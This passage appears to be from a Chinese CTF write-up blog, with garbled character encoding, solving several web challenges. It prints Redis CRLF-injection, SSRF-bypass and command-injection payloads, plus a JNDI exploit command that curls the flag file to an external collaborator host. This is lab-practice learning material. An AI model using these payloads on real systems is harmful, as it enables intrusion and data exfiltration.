&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t find admin:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;,fast fast fast.....&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?response?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">file&lt;/span>
&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.socket_host&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;server.socket_port&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">8080&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quickstart&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">web7&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨çš„urllib2.urlopenåº“åªæ”¯æŒhttp https ftp fileè¿™å‡ ç§schemaï¼Œä¸èƒ½ç”¨gopherï¼Œä½†æ˜¯æœ‰ä¸ªcveï¼ˆå’Œä¸Šå‘¨æžçš„nodejsçš„é‚£ä¸ªæœ‰ç‚¹åƒï¼‰ï¼Œå®ƒåœ¨å¤„ç†urlçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„httpå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211155739444.png" alt="image-20211211155739444">&lt;/p>
&lt;p>çœŸçš„è·Ÿnodejsé‚£ä¸ªå¾ˆåƒï¼Œnodeé‚£ä¸ªè¿˜å¤šä¸€ä¸ªä»‹è´¨ï¼ˆå¤„ç†unicodeå­—ç¬¦æ—¶è½¬åŒ–å‡ºé—®é¢˜ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å‘redisä¸­å†™å…¥è¾“å…¥æ”¹æŽ‰adminå¯†ç å°±è¡Œäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/amiz
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 åŠå†³èµ›]BabyJS
&lt;/h4>
&lt;/summary>
&lt;p>æ˜¯expressæ¡†æž¶ï¼Œcookieçš„sessionå­—æ®µåˆå§‹æ˜¯&lt;code>{&amp;quot;admin&amp;quot;:&amp;quot;no&amp;quot;}&lt;/code>ï¼Œæ”¹ä¸ºyesåŽè¿˜æ˜¯ä¼šé‡å®šå‘å›žæ¥ï¼›ç„¶åŽå‘çŽ°è‡ªå·±çœ¼çžŽæ²¡çœ‹è§é™„ä»¶ï¼Œæˆ‘çš„ï¼›è¯¦ç»†çš„è·¯ç”±ä»£ç åœ¨index.jsï¼Œçœ‹åˆ°blacklistå°±æœ‰SSRFçš„æ—¢è§†æ„Ÿäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../config&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">child_process&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;child_process&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;request&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Router&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1.xip.io&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;::ffff:127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;[::1]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;::1&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/debug&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">!=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// req.ipåœ¨é»‘åå•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;res&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[\&amp;#34;\&amp;#39;]/ig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`echo &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;/tmp/log`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">child_process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å‘½ä»¤æ‰§è¡Œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/log&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()});&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/debug&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// POST urlå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å¯¹urlè¿›è¡Œparse
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">hostname&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// hostnameä¸åœ¨é»‘åå•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">urlObject&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span> &lt;span style="color:#75715e">// è®¿é—® ç›®æ ‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">([]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éœ€è¦æž„é€ ä¸€ä¸ªssrfçš„urlï¼Œpostæ–¹å¼ä¼ å…¥å¹¶ä¸”ç»•è¿‡ssrfçš„é»‘åå•ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>http://0177.0.0.01/ # å…«è¿›åˆ¶
http://2130706433/ # åè¿›åˆ¶
&lt;/code>&lt;/pre>&lt;p>åŽé¢æŽ¥ä¸Š&lt;code>/debug?url=xxxx&lt;/code>ï¼Œpostä¼ å…¥åŽè°ƒç”¨&lt;code>request&lt;/code>ä¼šåˆ°&lt;code>get /debug&lt;/code>è¿›è¡Œå¤„ç†ï¼Œå°±å¯ä»¥&lt;code>child_process_exec&lt;/code>æ‰§è¡Œå‘½ä»¤äº†&lt;/p>
&lt;p>æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œå› ä¸ºåŽé¢å®ƒä¼šè¯»å‡º&lt;code>/tmp/log&lt;/code>çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠflagå†™å…¥è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œç”¨&lt;code>cp /flag /tmp/log&lt;/code>&lt;/p>
&lt;p>æž„é€ payloadæ—¶åŽŸä»£ç æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`echo &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;/tmp/log`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰€ä»¥å…ˆè¦é—­åˆechoåŽé¢çš„å•å¼•å·ï¼Œå†è€ƒè™‘&lt;code>url.parse(u).href&lt;/code>çš„ç»“æžœï¼Œæœ€åŽç”¨&lt;code>#&lt;/code>æŠŠåŽé¢å¤šä½™çš„æ³¨é‡ŠæŽ‰ï¼›ç„¶è€Œæœ‰ä¸ªæ­£åˆ™åŒ¹é…è¦å…ˆè¿‡æ»¤ä¸€ä¸‹å•å¼•å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[\&amp;#34;\&amp;#39;]/ig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰€ä»¥ç”¨äºŒæ¬¡urlç¼–ç ï¼š&lt;code>' -&amp;gt; %27 -&amp;gt; %2527&lt;/code>åŠ &lt;code>@&lt;/code>ï¼Œè®©&lt;code>url.parse().href&lt;/code>æ—¶è®©&lt;code>@&lt;/code>å‰çš„éƒ¨åˆ†è¢«decodeURIComponent&lt;/p>
&lt;p>payloadè¦å†ç¼–ä¸€æ¬¡ç &lt;/p>
&lt;pre tabindex="0">&lt;code>POST:
url=http://2130706433/debug?url=http://%252527@1;cp$IFS$9/flag$IFS$9/tmp/log;%25%23
&lt;/code>&lt;/pre>&lt;p>flag{876797a7-fe5f-4a11-aa1f-bd0fbcb1640e}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[çº¢æ˜Žè°·CTF 2021]JavaWeb
&lt;/h4>
&lt;/summary>
&lt;p>ä¸Žå¼ºç½‘æ‹Ÿæ€çš„Jack-Shiroç­‰ç­‰é¢˜éƒ½æ˜¯ä¸€æ ·çš„è€ƒç‚¹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ª/;/jsonç»•è¿‡é‰´æƒï¼Œä¹‹åŽæ˜¯jndiæ³¨å…¥ï¼Œç”¨é‚£ä¸ªjarä¸€æŠŠæ¢­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.db.JNDIConnectionSource&amp;#34;&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#f92672">&amp;#34;jndiLocation&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://101.35.114.107:1099/qhx0ip&amp;#34;&lt;/span>&lt;span style="color:#111">}]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &lt;span style="color:#d88200">&amp;#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag&amp;#34;&lt;/span> -A &lt;span style="color:#d88200">&amp;#34;101.35.114.107&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[b01lers2020]Scrambled
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢ä¸Šåªæœ‰ä¸€ä¸ªæ²¹ç®¡è§†é¢‘ï¼Œæ²¡æœ‰ç‰¹æ®Šçš„è¡Œä¸º&lt;/p>
&lt;p>æŠ“åŒ…çœ‹åˆ°cookieï¼Œåœ¨æ¯ä¸€æ¬¡reloadï¼ˆåœ¨é¡µé¢åº•éƒ¨ï¼‰ä¹‹åŽéƒ½ä¼šæ›´æ–°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220118163951941.png" alt="image-20220118163951941">&lt;/p>
&lt;p>ä¸¤ä¸ªå­—æ®µï¼Œfrequencyå’Œtransmissions&lt;/p>
&lt;p>æ²¡æ˜Žç™½å•¥æ„æ€ï¼Œçœ‹wpçŸ¥é“è¿™é‡Œæ˜¯ä»£è¡¨äº†æ¯ä¸€ä½flagçš„å€¼ï¼Œæ¯”å¦‚ä¸Šé¢å›¾ç‰‡é‡Œçš„&lt;/p>
&lt;pre tabindex="0">&lt;code>7-12 -&amp;gt; 12ä½æ˜¯`-` å‰ä¸€ä½æ˜¯`7`
0f15 -&amp;gt; 15ä½æ˜¯`f` å‰ä¸€ä½æ˜¯`0`
&lt;/code>&lt;/pre>&lt;p>æ•´ä¸ªpyè„šæœ¬è‡ªåŠ¨ï¼ˆå‚è€ƒ&lt;a href="https://blog.csdn.net/weixin_44037296/article/details/112549815">wp&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
import re
url = 'http://a3197079-a7bd-4d2f-847b-bad3410130b7.node4.buuoj.cn:81/'
headers = {'Cookie': 'frequency=1; transmissions=kxkxkxkxsh7-12kxkxkxkxsh'}
flag = [0] * 50
while True:
r = requests.session()
cookie = r.get(url, headers=headers).headers['Set-Cookie'] # å¾—åˆ°ä¸‹ä¸€æ¬¡çš„cookie
try:
tmp = re.search(r'kxkxkxkxsh(.+)kxkxkxkxsh;', cookie).group()[10:-11] # åŒ¹é…ä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ†
